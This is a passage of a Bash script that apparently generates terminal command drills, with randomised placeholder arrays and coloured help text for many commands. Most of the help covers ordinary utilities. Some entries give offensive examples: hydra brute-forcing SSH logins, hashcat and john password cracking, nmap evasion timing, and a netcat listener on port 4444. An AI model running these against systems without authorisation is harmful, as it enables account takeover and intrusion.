  snapshot.tar.xz bundle.tar release.tar.gz package.tar.gz source.tar.bz2 logs.tar.gz dump.tar.zst)
PHOTOS=(photo.jpg image.png screenshot.png evidence.jpg document.pdf
  scan.tiff capture.bmp diagram.svg icon.ico avatar.webp thumbnail.gif render.raw)
DIRS=(src lib bin tmp logs data config backup output cache
  build dist vendor node_modules target public static assets uploads downloads)
EXTS=(py js ts go rs c cpp java rb sh log txt conf yaml json
  toml md html css sql xml csv ini env php pl lua zig swift)
SEARCH_TERMS=(error warning panic fatal timeout exception failed invalid denied refused connection
  unauthorized forbidden crash segfault nullptr overflow leak abort reject throttle blocked suspend
  corrupt missing expired revoked)
USERNAMES=(admin root user guest test deploy www-data nginx postgres mysql
  git jenkins ansible prometheus grafana redis mongodb elastic backup operator service)
IPS=(10.0.0.1 10.0.0.5 10.10.10.10 192.168.1.1 192.168.1.100 172.16.0.1 10.0.0.50
  192.168.0.1 172.16.1.1 10.10.10.50 192.168.100.1 10.20.30.40 172.31.0.1 192.168.50.50 10.0.1.1)
SUBNETS=(10.0.0.0/24 192.168.1.0/24 172.16.0.0/16 10.10.10.0/24
  192.168.0.0/24 172.17.0.0/16 10.20.0.0/16 192.168.100.0/24 10.0.0.0/8 172.31.0.0/16)
PORTS=(22 80 443 8080 3000 5000 8000 3306 5432 6379 27017
  21 23 25 53 110 143 389 445 993 995 1433 1521 5900 8443)
MACS=(AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 DE:AD:BE:EF:CA:FE
  00:11:22:33:44:55 A1:B2:C3:D4:E5:F6 12:34:56:78:9A:BC FE:DC:BA:98:76:54
  CA:FE:BA:BE:00:01 01:23:45:67:89:AB AB:CD:EF:12:34:56)
URLS=(http://10.0.0.1 http://192.168.1.100 http://target.local http://10.10.10.10
  http://192.168.0.1 http://172.16.1.1 http://dev.local http://staging.local
  http://app.local http://api.local http://admin.local http://internal.local)
FIELDS=(name id status email timestamp user_id created_at value count type
  updated_at deleted_at version priority level source target duration size)
JSON_KEYS=(data items results users records entries
  events messages logs errors nodes objects resources payload)
REPLACE_OLD=(foo old debug localhost http TODO FIXME tmp
  dev staging test alpha beta v1 deprecated warn error secret)
REPLACE_NEW=(bar new prod 10.0.0.1 https DONE RESOLVED cache
  main production live release stable v2 current info success masked)
SIZES=(10M 50M 100M 500M 1G 5G 10G 100k 500k 2G)
TIMES=(5 15 30 60 120 180 360 720 1440 10080)
NUMBERS=(5 10 15 20 25 30 40 50 75 100 150 200 500)
COLUMNS=(1 2 3 4 5 6 7 8)
DELIMS=(',' ':' '\t' '|' ';' '/' '-' '_')
HASHCAT_MODES=(0 100 1400 1800 3200 1000 5600 13100 18200 22000 500 1700 2500 5500 11300)
HASH_NAMES=(MD5 SHA1 SHA256 sha512crypt bcrypt NTLM NetNTLMv2 Kerberoast-TGS ASREPRoast WPA-PBKDF2 md5crypt SHA-512 WPA NetNTLMv1 Bitcoin)
INTERFACES=(eth0 wlan0 ens33 enp0s3 ens192 enp0s25 wlp2s0 docker0 br0 virbr0)
WIFI_INTERFACES=(wlan0 wlp2s0 wlp3s0 wlan1)
REMOTE_HOSTS=(server backup-host db-server web-server jump-host bastion
  prod-01 staging-01 dev-01 ci-runner build-server cache-01 redis-01 postgres-01 monitor)
PROCS=(nginx apache2 mysqld postgres redis-server mongod node python3 java ruby
  docker containerd systemd sshd cron cups NetworkManager pulseaudio pipewire)
SERVICES=(nginx apache2 mysql postgresql redis docker containerd sshd
  NetworkManager bluetooth cups cronie fail2ban ufw firewalld syncthing)
SIGNALS=(SIGTERM SIGKILL SIGHUP SIGINT SIGUSR1 SIGUSR2 SIGSTOP SIGCONT)
BRANCHES=(main master develop feature/auth feature/api fix/login hotfix/security release/v2)

# ═══════════════════════════════════════════════════════════════════════════════
# DYNAMIC GENERATION HELPERS - True infinite variation
# ═══════════════════════════════════════════════════════════════════════════════

# Unbiased pick from phrasings
_phrase() {
  local -a opts=("$@")
  local len=${#opts[@]}
  ((len == 0)) && { echo ""; return; }
  local max=$((32768 - 32768 % len)) r
  while r=$RANDOM; ((r >= max)); do :; done
  echo "${opts[$((r % len))]}"
}

# Fast pick/rnum - set REPLY, no subshell (40 forks -> 0 in _ctx)
_fpick() { local -n _a=$1; REPLY="${_a[$((RANDOM % ${#_a[@]}))]}"; }
_fphrase() { local -a _a=("$@"); REPLY="${_a[$((RANDOM % ${#_a[@]}))]}"; }
_frnum() { REPLY=$(($1 + RANDOM % ($2 - $1 + 1))); }
# Fisher-Yates in-place shuffle via nameref (replaces shuf fork)
_fshuffle() { local -n _a=$1; local i j t; for ((i=${#_a[@]}-1; i>0; i--)); do j=$((RANDOM % (i+1))); t="${_a[$i]}"; _a[$i]="${_a[$j]}"; _a[$j]="$t"; done; }
_fshuffle_n() { _fshuffle "$1"; local -n _a=$1; (($2 < ${#_a[@]})) && _a=("${_a[@]:0:$2}"); }

_QV='log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col'
_ctx() {
  _fpick LOGS; log=$REPLY; _fpick LOGS; log2=$REPLY; _fpick CONFIGS; cfg=$REPLY; _fpick CONFIGS; cfg2=$REPLY
  _fpick TXTS; txt=$REPLY; _fpick TXTS; txt2=$REPLY; _fpick CSVS; csv=$REPLY; _fpick CSVS; csv2=$REPLY
  _fpick DIRS; dir=$REPLY; _fpick DIRS; dir2=$REPLY; _fpick EXTS; ext=$REPLY; _fpick EXTS; ext2=$REPLY
  _fpick SCRIPTS; script=$REPLY; _fpick ARCHIVES; archive=$REPLY; _fpick BINS; bin=$REPLY
  _fpick IMGS; img=$REPLY; _fpick PCAPS; pcap=$REPLY; _fpick HASHES; hash=$REPLY; _fpick PHOTOS; photo=$REPLY
  _fpick WORDLISTS; wordlist=$REPLY; _fpick IPS; ip=$REPLY; _fpick SUBNETS; subnet=$REPLY
  _fpick PORTS; port=$REPLY; _fpick PORTS; port2=$REPLY; _fpick MACS; mac=$REPLY
  _fpick URLS; url=$REPLY; _fpick USERNAMES; user=$REPLY; _fpick REMOTE_HOSTS; host=$REPLY
  _fpick SEARCH_TERMS; term=$REPLY; _fpick SEARCH_TERMS; term2=$REPLY; _fpick SEARCH_TERMS; term3=$REPLY
  _fpick FIELDS; field=$REPLY; _fpick FIELDS; field2=$REPLY; _fpick JSON_KEYS; key=$REPLY
  _fpick REPLACE_OLD; old=$REPLY; _fpick REPLACE_NEW; new=$REPLY; _fpick SIZES; size=$REPLY
  _fpick INTERFACES; iface=$REPLY; _fpick PROCS; proc=$REPLY; _fpick SERVICES; svc=$REPLY
  _fpick SIGNALS; sig=$REPLY; _fpick BRANCHES; branch=$REPLY; _fpick TIMES; time=$REPLY
  _frnum 1 20; n1=$REPLY; _frnum 5 50; n2=$REPLY; _frnum 2 10; n3=$REPLY; _frnum 1 5; col=$REPLY; n=$n1
}

# ═══════════════════════════════════════════════════════════════════════════════
# COMMAND EXPLANATIONS (shown on TAB)
# ═══════════════════════════════════════════════════════════════════════════════

# Compact manpage data: first line=desc, body lines already ANSI-formatted, stored pre-rendered
# Each entry: header\nbody lines (already formatted with escape codes)
declare -A MANPAGE=(
  [cd]=$'change directory\n  \e[33m.\e[0m         current directory      \e[33m..\e[0m        parent directory\n  \e[33m~\e[0m         home directory         \e[33m-\e[0m         previous directory\n  \e[33m../..\e[0m     up two levels'
  [echo]=$'print text to stdout\n  \e[36m-n\e[0m        no trailing newline    \e[36m-e\e[0m        enable escapes (\\n \\t)\n  \e[33m"$VAR"\e[0m    expands variables      \e[33m\x27text\x27\e[0m   literal (no expansion)\n  \e[2mecho hello    echo "$HOME"    echo -n "no newline"    echo -e "line1\\nline2"\e[0m'
  [pwd]=$'print working directory'
  [touch]=$'create empty file or update timestamp\n  \e[36m-t\e[0m \e[33mSTAMP\e[0m  set specific time\n  \e[2mtouch newfile    touch -t 202301010000 file\e[0m'
  [mv]=$'move or rename files\n  \e[36m-i\e[0m        confirm before overwrite\n  \e[36m-n\e[0m        never overwrite\n  \e[2mmv old.txt new.txt    mv file.txt dir/    mv *.log archive/\e[0m'
  [rm]=$'delete files permanently\n  \e[36m-r\e[0m        recursive (dirs)       \e[36m-f\e[0m        force (no prompt)\n  \e[36m-i\e[0m        confirm each file\n  \e[2mrm file.txt    rm -r dir/    rm -rf dir/    rm -i *.log\e[0m'
  [ln]=$'create links\n  \e[36m-s\e[0m        symbolic (soft) link   \e[2m(without -s: hard link)\e[0m\n  \e[33mhard\e[0m      same inode, same disk  \e[33msoft\e[0m      path pointer, cross-disk\n  \e[2mln file hardlink    ln -s target symlink    ln -sf target link\e[0m'
  [test]=$'evaluate conditional expression\n  \e[36m-f\e[0m \e[33mFILE\e[0m   is regular file        \e[36m-d\e[0m \e[33mFILE\e[0m   is directory\n  \e[36m-e\e[0m \e[33mFILE\e[0m   exists                 \e[36m-r\e[0m \e[33mFILE\e[0m   is readable\n  \e[36m-z\e[0m \e[33mSTR\e[0m    string is empty        \e[36m-n\e[0m \e[33mSTR\e[0m    string not empty\n  \e[36m-eq\e[0m       equal (numeric)        \e[36m-lt\e[0m       less than\n  \e[36m-gt\e[0m       greater than           \e[36m-ne\e[0m       not equal\n  \e[2m[[ -f file ]] && echo yes    [[ -z "$var" ]]    [[ $a -eq $b ]]\e[0m'
  [ls]=$'list directory contents\n  \e[36m-l\e[0m        details (permissions, owner, size, date)\n  \e[36m-a\e[0m        show hidden            \e[36m-h\e[0m        human sizes\n  \e[36m-S\e[0m        sort by size           \e[36m-t\e[0m        sort by time\n  \e[36m-d\e[0m        dirs themselves        \e[36m-R\e[0m        recursive\n  \e[36m-1\e[0m        one per line\n  \e[2mls -la    ls -lh    ls -lS    ls -lt    ls -d */\e[0m'
  [cat]=$'concatenate and print files\n  \e[36m-n\e[0m        number all lines\n  \e[33mvs less\e[0m   cat dumps everything at once (good for short files, piping)\n          less lets you scroll (good for long files)\n  \e[2mcat file.txt    cat -n file.txt    cat a.txt b.txt > merged.txt\e[0m'
  [head]=$'output first part of files\n  \e[36m-n\e[0m \e[33mN\e[0m      first \e[33mN\e[0m lines \e[2m(or head -N)\e[0m\n  \e[2mhead file.txt    head -n 5 file.txt    head -20 file.txt\e[0m'
  [tail]=$'output last part of files\n  \e[36m-n\e[0m \e[33mN\e[0m      last \e[33mN\e[0m lines           \e[36m-f\e[0m        follow (live updates)\n  \e[2mtail file.txt    tail -n 20 file.txt    tail -f /var/log/syslog\e[0m'
  [less]=$'pager (scroll through files)\n  \e[36m-N\e[0m        show line numbers\n  \e[2mless file.txt    less -N file.txt\e[0m'
  [cp]=$'copy files\n  \e[36m-r\e[0m        recursive (dirs)\n  \e[2mcp file.txt backup.txt    cp -r dir/ newdir/\e[0m'
  [mkdir]=$'make directories\n  \e[36m-p\e[0m        create parents\n  \e[2mmkdir newdir    mkdir -p path/to/dir\e[0m'
  [tree]=$'directory tree\n  \e[36m-L\e[0m \e[33mN\e[0m      depth limit\n  \e[2mtree    tree -L 2\e[0m'
  [tee]=$'copy stdin to file AND stdout\n  \e[36m-a\e[0m        append (don\x27t overwrite)\n  \e[33mvs >>\e[0m     >> sends to file only (terminal goes dark)\n          tee sends to file AND keeps output on screen\n  \e[2mecho hello | tee file.txt    ls | tee -a log.txt\e[0m'
  [grep]=$'search text patterns\n  \e[36m-r\e[0m        recursive              \e[36m-i\e[0m        ignore case\n  \e[36m-n\e[0m        line numbers           \e[36m-c\e[0m        count matches\n  \e[36m-l\e[0m        files only             \e[36m-v\e[0m        invert match\n  \e[36m-o\e[0m        matched text only      \e[36m-q\e[0m        quiet (exit code)\n  \e[36m-w\e[0m        whole word             \e[36m-x\e[0m        whole line\n  \e[36m-E\e[0m        extended regex \e[2m(+?|)\e[0m  \e[36m-P\e[0m        perl regex \e[2m(\\d \\w lookahead)\e[0m\n  \e[36m-F\e[0m        literal string         \e[36m-f\e[0m \e[33mFILE\e[0m   patterns from file\n  \e[36m-A\e[0m \e[33mN\e[0m      lines after            \e[36m-B\e[0m \e[33mN\e[0m      lines before\n  \e[36m-C\e[0m \e[33mN\e[0m      context lines          \e[36m--include\e[0m  file pattern\n  \e[36m--exclude-dir\e[0m  skip directory\n  \e[33mvs rg\e[0m     grep is POSIX (everywhere). rg is faster, skips .gitignore,\n          recurses by default. use grep for portability, rg for speed\n  \e[2mgrep -rn TODO .    grep -ri pattern file    grep -oE '\''[0-9]+'\'' log\e[0m'
  [rg]=$'fast grep (ripgrep)\n  \e[36m-i\e[0m        ignore case            \e[36m-v\e[0m        invert match\n  \e[36m-n\e[0m        line numbers           \e[36m-c\e[0m        count matches\n  \e[36m-l\e[0m        files only             \e[36m-o\e[0m        matched text only\n  \e[36m-q\e[0m        quiet (exit code)      \e[36m-w\e[0m        whole word\n  \e[36m-x\e[0m        whole line             \e[36m-F\e[0m        literal string\n  \e[36m-f\e[0m \e[33mFILE\e[0m   patterns from file     \e[36m-t\e[0m \e[33mTYPE\e[0m   file type filter\n  \e[36m-g\e[0m \e[33mGLOB\e[0m   file glob filter       \e[36m-A\e[0m \e[33mN\e[0m      lines after\n  \e[36m-B\e[0m \e[33mN\e[0m      lines before           \e[36m-C\e[0m \e[33mN\e[0m      context lines\n  \e[33mvs grep\e[0m   rg is faster, recursive by default, skips .gitignore.\n          grep is POSIX (works on any machine). use rg locally, grep in scripts\n  \e[2mrg pattern    rg -i todo    rg -t py import    rg -l error\e[0m'
  [find]=$'search for files\n  \e[36m-name\e[0m \e[2m'\''X'\''\e[0m   filename            \e[36m-iname\e[0m     case-insensitive\n  \e[36m-type\e[0m \e[2mf/d/l\e[0m  file type           \e[36m-size\e[0m \e[2m+10M\e[0m  by size\n  \e[36m-mtime\e[0m \e[2m-7\e[0m   modified days       \e[36m-mmin\e[0m \e[2m-60\e[0m   modified mins\n  \e[36m-amin\e[0m \e[2m-60\e[0m   accessed mins       \e[36m-empty\e[0m     empty files\n  \e[36m-executable\e[0m    has exec bit        \e[36m-perm\e[0m \e[2m-4000\e[0m by permission\n  \e[36m-maxdepth\e[0m \e[33mN\e[0m   limit depth         \e[36m-path\e[0m \e[2m'\''X'\''\e[0m   match path\n  \e[36m-not\e[0m          negate              \e[36m-print0\e[0m    null delimit\n  \e[36m-exec\e[0m \e[2mCMD {} \\;\e[0m  run per file  \e[36m-exec\e[0m \e[2mCMD {} +\e[0m   batch (faster)\n  \e[36m-delete\e[0m        remove\n  \e[33mvs fd\e[0m     find is POSIX (everywhere, complex predicates). fd is faster,\n          uses regex, skips .gitignore. use find for scripts, fd for speed\n  \e[2mfind . -name "*.log"    find / -size +100M    find . -type f -empty\e[0m'
  [fd]=$'fast find\n  \e[36m-e\e[0m \e[33mEXT\e[0m    file extension         \e[36m-t\e[0m \e[33mTYPE\e[0m   f/d/l/x/e\n  \e[36m-d\e[0m \e[33mN\e[0m      max depth              \e[36m-E\e[0m \e[33mPAT\e[0m    exclude pattern\n  \e[36m-H\e[0m        include hidden         \e[36m-i\e[0m        ignore case\n  \e[36m-S\e[0m \e[33mSIZE\e[0m   by size (+/-N)         \e[36m-l\e[0m        long listing\n  \e[36m-p\e[0m        match full path        \e[36m-g\e[0m        glob pattern\n  \e[36m-x\e[0m \e[33mCMD\e[0m    execute per result\n  \e[36m--changed-within\e[0m \e[33mT\e[0m             \e[36m--changed-before\e[0m \e[33mT\e[0m\n  \e[33mvs find\e[0m   fd is faster, regex by default, skips .gitignore + hidden.\n          find is POSIX (works anywhere), has -exec {} +, -delete, complex logic\n  \e[2mfd pattern    fd -e py    fd -t d    fd -S +10M    fd -x rm {}\e[0m'
  [sort]=$'sort lines of text\n  \e[36m-n\e[0m        numeric                \e[36m-r\e[0m        reverse\n  \e[36m-u\e[0m        unique                 \e[36m-k\e[0m \e[33mN\e[0m      by column \e[33mN\e[0m\n  \e[36m-t\e[0m \e[33mC\e[0m      delimiter              \e[36m-h\e[0m        human numeric\n  \e[36m-f\e[0m        ignore case\n  \e[2msort file.txt    sort -n nums.txt    sort -t, -k2 data.csv\e[0m'
  [uniq]=$'filter repeated lines\n  \e[36m-c\e[0m        count occurrences      \e[36m-d\e[0m        only duplicates\n  \e[36m-u\e[0m        only unique            \e[36m-D\e[0m        all duplicates\n  \e[33mvs sort -u\e[0m sort -u just deduplicates. uniq can COUNT (-c), show\n          ONLY dupes (-d), or ONLY unique (-u). that'\''s why both exist\n  \e[2msort file | uniq    sort file | uniq -c    sort file | uniq -D\e[0m'
  [cut]=$'extract columns/fields\n  \e[36m-d\e[0m \e[33mC\e[0m      delimiter              \e[36m-f\e[0m \e[33mN\e[0m      field \e[33mN\e[0m\n  \e[36m-c\e[0m \e[33mN\e[0m      character \e[33mN\e[0m            \e[36m--complement\e[0m invert\n  \e[33mvs awk\e[0m    cut is simpler/faster for grabbing columns.\n          awk is a full language — use it when you need math, conditions, or logic\n  \e[2mcut -d, -f1 data.csv    cut -d: -f1 /etc/passwd    cut -c1-10 file\e[0m'
  [wc]=$'word, line, byte count\n  \e[36m-l\e[0m        lines                  \e[36m-w\e[0m        words\n  \e[36m-c\e[0m        bytes                  \e[36m-m\e[0m        characters\n  \e[2mwc -l file.txt    wc -w file.txt    ls | wc -l\e[0m'
  [tr]=$'translate characters\n  \e[36m-d\e[0m        delete chars           \e[36m-s\e[0m        squeeze consecutive dupes to one\n  \e[2mtr a-z A-Z < file    tr -d '\''\\n'\'' < file    tr -s '\'' '\'' < file\e[0m'
  [sed]=$'stream editor\n  \e[33m'\''s/old/new/'\''\e[0m    replace first     \e[33m'\''s/old/new/g'\''\e[0m  replace all\n  \e[36m-i\e[0m            edit in place     \e[33m'\''/pat/d'\''\e[0m       delete lines\n  \e[36m-n\e[0m            suppress output  \e[36m-e\e[0m            multi commands\n  \e[36m-E\e[0m            extended regex\n  \e[33mvs awk\e[0m        sed is best for search-and-replace and line filtering.\n              awk is best for column-based processing and math\n  \e[2msed '\''s/foo/bar/g'\'' file    sed -i '\''/^#/d'\'' file    sed -n '\''5,10p'\'' file\e[0m'
  [awk]=$'pattern scanning\n  \e[33m'\''{print $1}'\''\e[0m   first field       \e[33m'\''{print $NF}'\''\e[0m  last field\n  \e[36m-F\e[0m\e[2m'\'','\''\e[0m          delimiter          \e[33mNR\e[0m          line number\n  \e[2mawk '\''{print $1}'\'' file    awk -F, '\''{print $2}'\'' data.csv    awk '\''/error/'\'' log\e[0m'
  [xargs]=$'build commands from stdin\n  \e[36m-I\e[0m \e[2m{}\e[0m     placeholder            \e[36m-0\e[0m        null delim\n  \e[36m-n\e[0m \e[33mN\e[0m      args per command       \e[36m-P\e[0m \e[33mN\e[0m      parallel\n  \e[36m-p\e[0m        confirm each           \e[36m-t\e[0m        trace (show cmd)\n  \e[2mfind . -print0 | xargs -0 rm    cat urls | xargs -P4 -I{} curl {}\e[0m'
  [tar]=$'archive tool\n  \e[36m-c\e[0m create   \e[36m-x\e[0m extract   \e[36m-t\e[0m list     \e[36m-f\e[0m \e[33mFILE\e[0m\n  \e[36m-z\e[0m gzip     \e[36m-C\e[0m \e[33mDIR\e[0m       extract to\n  \e[2mtar czf archive.tar.gz dir/    tar xzf archive.tar.gz    tar tf archive.tar.gz\e[0m'
  [chmod]=$'change file permissions\n  \e[33m+x\e[0m        add execute            \e[33m755\e[0m       rwxr-xr-x\n  \e[33m644\e[0m       rw-r--r--              \e[33mg+w\e[0m       group write\n  \e[36m-R\e[0m        recursive              \e[36m--reference\e[0m=\e[33mFILE\e[0m copy perms\n  \e[2mchmod +x script.sh    chmod 755 script.sh    chmod -R a+r dir/\e[0m'
  [ps]=$'list processes\n  \e[33maux\e[0m       all users, detailed    \e[36m--sort\e[0m=\e[33mFIELD\e[0m sort by field\n  \e[2mps aux    ps aux --sort=-%mem | head    ps auxf\e[0m'
  [du]=$'disk usage\n  \e[36m-h\e[0m        human readable         \e[36m-s\e[0m        summary only\n  \e[2mdu -sh .    du -sh */\e[0m'
  [df]=$'disk free space\n  \e[36m-h\e[0m        human readable\n  \e[2mdf -h    df -h /home\e[0m'
  [ssh]=$'secure shell\n  \e[36m-L\e[0m \e[2mP:H:P\e[0m  local forward          \e[36m-R\e[0m \e[2mP:H:P\e[0m  remote forward\n  \e[36m-D\e[0m \e[33mPORT\e[0m   SOCKS proxy            \e[36m-J\e[0m \e[33mHOST\e[0m   jump host\n  \e[36m-N\e[0m        no command             \e[36m-f\e[0m        background\n  \e[36m-T\e[0m        no tty\n  \e[2mssh user@host    ssh -L 8080:localhost:80 host    ssh -D 1080 host\e[0m'
  [curl]=$'HTTP client\n  \e[36m-X\e[0m \e[33mMETHOD\e[0m  GET/POST/PUT/DELETE   \e[36m-H\e[0m \e[2m'\''K: V'\''\e[0m  header\n  \e[36m-d\e[0m \e[33mDATA\e[0m    POST body              \e[36m-o\e[0m \e[33mFILE\e[0m   output file\n  \e[36m-L\e[0m         follow redirects       \e[36m-s\e[0m        silent\n  \e[36m-i\e[0m         show headers           \e[36m-O\e[0m        save original name\n  \e[33mvs wget\e[0m     curl is for APIs (headers, POST, methods).\n              wget is for downloading files (auto-resume, recursive mirror)\n  \e[2mcurl -s url    curl -X POST -d "data" url    curl -O url/file.tar.gz\e[0m'
  [wget]=$'file downloader\n  \e[36m-c\e[0m        continue download      \e[36m-m\e[0m        mirror site\n  \e[36m-k\e[0m        convert links\n  \e[33mvs curl\e[0m    wget is for downloading files (auto-resume, recursive).\n          curl is for API work (headers, POST, methods)\n  \e[2mwget url    wget -c url    wget -mk url\e[0m'
  [git]=$'version control\n  \e[33madd\e[0m     stage      \e[33mcommit\e[0m  save       \e[33mpush\e[0m    upload\n  \e[33mpull\e[0m    download   \e[33mstatus\e[0m  changes    \e[33mdiff\e[0m    compare\n  \e[33mlog\e[0m     history    \e[33mbranch\e[0m  branches   \e[33mmerge\e[0m   combine\n  \e[33mrebase\e[0m  replay     \e[33mstash\e[0m   shelve     \e[33mreset\e[0m   undo\n  \e[2mgit add .    git commit -m "msg"    git log --oneline    git stash\e[0m'
  [ss]=$'socket statistics\n  \e[36m-t\e[0m        TCP                    \e[36m-u\e[0m        UDP\n  \e[36m-l\e[0m        listening              \e[36m-n\e[0m        numeric ports\n  \e[36m-p\e[0m        show process           \e[36m-a\e[0m        all sockets\n  \e[2mss -tlnp    ss -tunap    ss -t state established\e[0m'
  [systemctl]=$'systemd control\n  \e[33mstart\e[0m     start service          \e[33mstop\e[0m      stop service\n  \e[33menable\e[0m    start on boot          \e[33mdisable\e[0m   no auto-start\n  \e[33mstatus\e[0m    show status            \e[33mrestart\e[0m   restart service\n  \e[33mreload\e[0m    reload config          \e[33mmask\e[0m      prevent starting\n  \e[33mdaemon-reload\e[0m  reload unit files  \e[36m--failed\e[0m  show failures\n  \e[2msystemctl status nginx    systemctl enable sshd    systemctl --failed\e[0m'
  [journalctl]=$'systemd logs\n  \e[36m-u\e[0m \e[33mUNIT\e[0m   service logs           \e[36m-f\e[0m        follow live\n  \e[36m-n\e[0m \e[33mN\e[0m      last \e[33mN\e[0m lines           \e[36m-b\e[0m        current boot\n  \e[36m-p\e[0m \e[33mLEVEL\e[0m  priority (err/warn)    \e[36m-k\e[0m        kernel messages\n  \e[36m-o\e[0m \e[33mFMT\e[0m    output format          \e[36m--since\e[0m   time filter\n  \e[36m--disk-usage\e[0m   journal size      \e[36m--vacuum-size\e[0m=\e[33mN\e[0m  shrink to\n  \e[36m--no-pager\e[0m     no less/more\n  \e[2mjournalctl -u nginx -f    journalctl -b -p err    journalctl --disk-usage\e[0m'
  [crontab]=$'scheduled tasks\n  \e[36m-e\e[0m        edit crontab           \e[36m-l\e[0m        list jobs\n  \e[36m-r\e[0m        remove all jobs\n  \e[2mcrontab -e    crontab -l    sudo crontab -e\e[0m'
  [tmux]=$'terminal multiplexer\n  \e[33mnew\e[0m \e[36m-s\e[0m \e[33mNAME\e[0m   new session     \e[33mattach\e[0m \e[36m-t\e[0m \e[33mNAME\e[0m  reattach\n  \e[33mls\e[0m              list sessions   \e[33mkill-session\e[0m \e[36m-t\e[0m \e[33mNAME\e[0m\n  \e[2mtmux new -s work    tmux attach -t work    tmux ls\e[0m'
  [nmap]=$'network scanner\n  \e[36m-sS\e[0m       SYN (half-open)          \e[36m-sT\e[0m       TCP connect\n  \e[36m-sU\e[0m       UDP scan               \e[36m-sV\e[0m       version detect\n  \e[36m-sC\e[0m       default scripts        \e[36m-O\e[0m        OS detection\n  \e[36m-A\e[0m        aggressive (all)       \e[36m-F\e[0m        fast (top 100)\n  \e[36m-p\e[0m \e[33mPORTS\e[0m  specific ports         \e[36m-p-\e[0m       all 65535 ports\n  \e[36m-Pn\e[0m       skip discovery         \e[36m-sn\e[0m       ping sweep\n  \e[36m-sL\e[0m       list targets           \e[36m-PR\e[0m       ARP scan\n  \e[36m-oA\e[0m \e[33mPFX\e[0m   all output formats     \e[36m-oG\e[0m \e[33mFILE\e[0m  greppable output\n  \e[36m-T1\e[0m       slow (evasion)         \e[36m-T4\e[0m       fast timing\n  \e[36m--top-ports\e[0m \e[33mN\e[0m  top N ports       \e[36m--script\e[0m \e[33mNAME\e[0m  NSE script\n  \e[2mnmap -sV -sC host    nmap -A -p- host    nmap -sn 192.168.1.0/24\e[0m'
  [hydra]=$'network login cracker\n  \e[36m-l\e[0m \e[33mUSER\e[0m   single username        \e[36m-L\e[0m \e[33mFILE\e[0m   username list\n  \e[36m-P\e[0m \e[33mFILE\e[0m   password list          \e[36m-t\e[0m \e[33mN\e[0m      threads per target\n  \e[2mhydra -l admin -P pass.txt ssh://192.168.1.1\e[0m'
  [hashcat]=$'GPU hash cracker\n  \e[36m-m\e[0m \e[33mTYPE\e[0m   hash type \e[2m(0=MD5 100=SHA1 1000=NTLM 1800=sha512crypt)\e[0m\n  \e[36m-a\e[0m \e[33mMODE\e[0m   attack \e[2m(0=dict, 3=brute)\e[0m     \e[36m--show\e[0m   show cracked\n  \e[36m-r\e[0m \e[33mFILE\e[0m   rules file             \e[36m--restore\e[0m resume session\n  \e[2mhashcat -m 0 hash.txt wordlist.txt    hashcat -m 1000 -a 3 hash ?a?a?a?a\e[0m'
  [john]=$'password cracker\n  \e[36m--wordlist\e[0m=\e[33mFILE\e[0m   dictionary attack\n  \e[36m--show\e[0m            display cracked    \e[36m--list\e[0m=formats  list types\n  \e[2mjohn --wordlist=rockyou.txt hash.txt    john --show hash.txt\e[0m'
  [tshark]=$'terminal packet analyzer\n  \e[36m-i\e[0m \e[33mIFACE\e[0m  capture live           \e[36m-r\e[0m \e[33mFILE\e[0m   read pcap\n  \e[36m-w\e[0m \e[33mFILE\e[0m   write pcap             \e[36m-c\e[0m \e[33mN\e[0m      capture N packets\n  \e[36m-Y\e[0m \e[33mFILTER\e[0m display filter         \e[36m-T\e[0m fields output format\n  \e[36m-e\e[0m \e[33mFIELD\e[0m  extract field          \e[36m-q\e[0m        quiet (stats only)\n  \e[36m-z\e[0m \e[33mSTAT\e[0m   statistics\n  \e[2mtshark -i eth0 -w cap.pcap    tshark -r cap.pcap -Y http    tshark -q -z conv,tcp\e[0m'
  [tcpdump]=$'packet capture\n  \e[36m-i\e[0m \e[33mIFACE\e[0m  capture interface      \e[36m-w\e[0m \e[33mFILE\e[0m   write to pcap\n  \e[36m-r\e[0m \e[33mFILE\e[0m   read from pcap         \e[36m-c\e[0m \e[33mN\e[0m      capture N packets\n  \e[36m-n\e[0m        no DNS resolution      \e[36m-vvv\e[0m      max verbosity\n  \e[2mtcpdump -i eth0 -w cap.pcap    tcpdump -r cap.pcap    tcpdump -i eth0 -c 100\e[0m'
  [nc]=$'network tool (netcat)\n  \e[36m-l\e[0m        listen mode            \e[36m-v\e[0m        verbose\n  \e[36m-p\e[0m \e[33mPORT\e[0m   local port             \e[36m-z\e[0m        scan (no data)\n  \e[36m-n\e[0m        no DNS resolution\n  \e[2mnc -lvnp 4444    nc -zv host 1-1000\e[0m'
  [iptables]=$'firewall rules\n  \e[36m-A\e[0m \e[33mCHAIN\e[0m  append rule            \e[36m-L\e[0m        list rules\n  \e[36m-F\e[0m        flush all              \e[36m-X\e[0m        delete chains\n  \e[36m-j\e[0m \e[33mTARGET\e[0m ACCEPT/DROP/REJECT    \e[36m-p\e[0m \e[33mPROTO\e[0m  tcp/udp\n  \e[36m-s\e[0m \e[33mIP\e[0m     source address         \e[36m-m\e[0m \e[33mMOD\e[0m    match module\n  \e[36m-n\e[0m        numeric output         \e[36m-v\e[0m        verbose\n  \e[36m--dport\e[0m \e[33mPORT\e[0m  destination port  \e[36m--limit\e[0m \e[33mRATE\e[0m  rate limit\n  \e[2miptables -A INPUT -s IP -j DROP    iptables -L -n -v    iptables -F\e[0m'
  [eza]=$'modern ls replacement\n  \e[36m-l\e[0m        details (perms, owner, size, date)\n  \e[36m-a\e[0m        show hidden\n  \e[36m-h\e[0m        human sizes            \e[36m-R\e[0m        recursive\n  \e[36m-T\e[0m        tree view              \e[36m-L\e[0m \e[33mN\e[0m      tree depth\n  \e[36m-D\e[0m        dirs only              \e[36m-r\e[0m        reverse sort\n  \e[36m--sort\e[0m \e[33mFIELD\e[0m  sort by field\n  \e[2meza -la    eza -T -L 2    eza --sort size\e[0m'
  [pacman]=$'package manager (Arch)\n  \e[36m-S\e[0m \e[33mPKG\e[0m    install package        \e[36m-Sy\e[0m       sync repos\n  \e[36m-Syu\e[0m      full upgrade            \e[36m-Ss\e[0m \e[33mTERM\e[0m  search packages\n  \e[36m-Q\e[0m        list installed          \e[36m-Qi\e[0m \e[33mPKG\e[0m   package info\n  \e[36m-Qo\e[0m \e[33mFILE\e[0m  which package owns\n  \e[2mpacman -Syu    pacman -Ss term    pacman -Qi pkg    pacman -Qo /usr/bin/cmd\e[0m'
